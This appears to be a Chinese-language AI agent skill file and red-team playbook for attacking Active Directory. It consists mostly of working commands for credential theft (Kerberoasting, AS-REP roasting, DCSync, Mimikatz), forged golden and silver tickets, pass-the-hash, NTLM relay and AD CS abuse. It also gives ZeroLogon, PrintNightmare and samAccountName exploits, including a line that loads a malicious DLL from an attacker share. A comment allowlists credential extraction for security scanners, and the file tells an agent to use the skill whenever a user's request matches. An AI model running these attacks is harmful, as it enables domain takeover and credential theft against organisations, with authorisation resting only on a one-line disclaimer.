---
name: active-directory-attacks
description: "提供攻击 Microsoft Active Directory 环境的全面技术。涵盖侦察、凭证收集、Kerberos 攻击、横向移动、权限提升和域控制，适用于红队操作和渗透测试。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权的安全评估、防御性验证或受控的教育环境。

<!-- security-allowlist: credential-extraction, kerberos-attacks -->

# Active Directory 攻击

## 目的

提供攻击 Microsoft Active Directory 环境的全面技术。涵盖侦察、凭证收集、Kerberos 攻击、横向移动、权限提升和域控制，适用于红队操作和渗透测试。

## 输入/前提条件

- Kali Linux 或 Windows 攻击平台
- 域用户凭证（大部分攻击需要）
- 能访问域控制器
- 工具：Impacket、Mimikatz、BloodHound、Rubeus、CrackMapExec

## 输出/交付物

- 域枚举数据
- 提取的凭证和哈希
- 用于模拟的 Kerberos 票据
- 域管理员访问权限
- 持久化访问机制

---

## 必要工具

| 工具 | 用途 |
|------|---------|
| BloodHound | AD 攻击路径可视化 |
| Impacket | Python AD 攻击工具 |
| Mimikatz | 凭证提取 |
| Rubeus | Kerberos 攻击 |
| CrackMapExec | 网络利用 |
| PowerView | AD 枚举 |
| Responder | LLMNR/NBT-NS 毒化 |

---

## 核心工作流程

### 步骤 1：Kerberos 时钟同步

Kerberos 需要时钟同步（±5 分钟）：

```bash
# 检测时钟漂移
nmap -sT 10.10.10.10 -p445 --script smb2-time

# 修复 Linux 时钟
sudo date -s "14 APR 2024 18:25:16"

# 修复 Windows 时钟
net time /domain /set

# 在不更改系统时间的情况下伪造时钟
faketime -f '+8h' <command>
```

### 步骤 2：使用 BloodHound 进行 AD 侦察

```bash
# 启动 BloodHound
neo4j console
bloodhound --no-sandbox

# 使用 SharpHound 收集数据
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Python 收集器（从 Linux）
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### 步骤 3：PowerView 枚举

```powershell
# 获取域信息
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# 枚举用户
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# 枚举组
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# 查找本地管理员访问权限
Find-LocalAdminAccess -Verbose

# 用户搜索
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

---

## 凭证攻击

### 密码喷射

```bash
# 使用 kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# 使用 CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```

### Kerberoasting

提取服务账户 TGS 票据并离线破解：

```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt

# 使用 hashcat 破解
hashcat -m 13100 hashes.txt rockyou.txt
```

### AS-REP Roasting

目标账户为"不需要 Kerberos 预身份验证"：

```bash
# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# 使用 hashcat 破解
hashcat -m 18200 hashes.txt rockyou.txt
```

### DCSync 攻击

直接从 DC 提取凭证（需要"复制目录更改"权限）：

```bash
# Impacket
secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## Kerberos 票据攻击

### Pass-the-Ticket（黄金票据）

使用 krbtgt 哈希为任意用户伪造 TGT：

```powershell
# 首先通过 DCSync 获取 krbtgt 哈希
# Mimikatz - 创建黄金票据
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

### 白银票据

为特定服务伪造 TGS：

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

### Pass-the-Hash

```bash
# Impacket
psexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
wmiexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
smbexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH

# CrackMapExec
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH --local-auth
```

### OverPass-the-Hash

将 NTLM 哈希转换为 Kerberos 票据：

```bash
# Impacket
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache

# Rubeus
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
```

---

## NTLM 中继攻击

### Responder + ntlmrelayx

```bash
# 启动 Responder（禁用 SMB/HTTP 以进行中继）
responder -I eth0 -wrf

# 启动中继
ntlmrelayx.py -tf targets.txt -smb2support

# LDAP 中继用于委派攻击
ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
```

### SMB 签名检查

```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
```

---

## 证书服务攻击（AD CS）

### ESC1 - 配置错误的模板

```bash
# 查找易受攻击的模板
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10

# 利用 ESC1
certipy req -u user@domain.local -p password -ca CA-NAME -target dc.domain.local -template VulnTemplate -upn administrator@domain.local

# 使用证书进行身份验证
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC8 - Web 注册中继

```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

---

## 关键 CVE

### ZeroLogon（CVE-2020-1472）

```bash
# 检查漏洞
crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon

# 利用
python3 cve-2020-1472-exploit.py DC01 10.10.10.10

# 提取哈希
secretsdump.py -just-dc domain.local/DC01\$@10.10.10.10 -no-pass

# 恢复密码（重要！）
python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
```

### PrintNightmare（CVE-2021-1675）

```bash
# 检查漏洞
rpcdump.py @10.10.10.10 | grep 'MS-RPRN'

# 利用（需要托管恶意 DLL）
python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
```

### samAccountName 欺骗（CVE-2021-42278/42287）

```bash
# 自动化利用
python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
```

---

## 快速参考

| 攻击 | 工具 | 命令 |
|--------|------|---------|
| Kerberoast | Impacket | `GetUserSPNs.py domain/user:pass -request` |
| AS-REP Roast | Impacket | `GetNPUsers.py domain/ -usersfile users.txt` |
| DCSync | secretsdump | `secretsdump.py domain/admin:pass@DC` |
| Pass-the-Hash | psexec | `psexec.py domain/user@target -hashes :HASH` |
| Golden Ticket | Mimikatz | `kerberos::golden /user:Admin /krbtgt:HASH` |
| Spray | kerbrute | `kerbrute passwordspray -d domain users.txt Pass` |

---

## 约束条件

**必须：**
- 在 Kerberos 攻击前与 DC 同步时间
- 大多数攻击需要有效的域凭证
- 记录所有被入侵的账户

**禁止：**
- 使用过多密码喷射锁定账户
- 未经批准修改生产 AD 对象
- 不留文档记录就使用黄金票据

**应该：**
- 运行 BloodHound 发现攻击路径
- 在中继攻击前检查 SMB 签名
- 验证 CVE 利用的补丁级别

---

## 示例

### 示例 1：通过 Kerberoasting 入侵域

```bash
# 1. 查找有 SPN 的服务账户
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10

# 2. 请求 TGS 票据
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# 3. 破解票据
hashcat -m 13100 tgs.txt rockyou.txt

# 4. 使用破解的服务账户
psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
```

### 示例 2：NTLM 中继到 LDAP

```bash
# 1. 启动针对 LDAP 的中继
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

# 2. 触发身份验证（例如通过 PrinterBug）
python3 printerbug.py domain.local/user:pass@target 10.10.10.12

# 3. 使用创建的机器账户进行 RBCD 攻击
```

---

## 故障排除

| 问题 | 解决方案 |
|-------|----------|
| 时钟漂移过大 | 与 DC 同步时间或使用 faketime |
| Kerberoasting 返回空 | 没有带 SPN 的服务账户 |
| DCSync 访问被拒绝 | 需要"复制目录更改"权限 |
| NTLM 中继失败 | 检查 SMB 签名，尝试 LDAP 目标 |
| BloodHound 为空 | 验证收集器是否使用正确凭证运行 |

---

## 其他资源

有关委派攻击、GPO 滥用、RODC 攻击、SCCM/WSUS 部署、ADCS 利用、信任关系和 Linux AD 集成的高级技术，请参阅 [references/advanced-attacks.md](references/advanced-attacks.md)。

## 使用场景
当用户描述的工作流或行动与本概述相符时，可使用此技能执行。
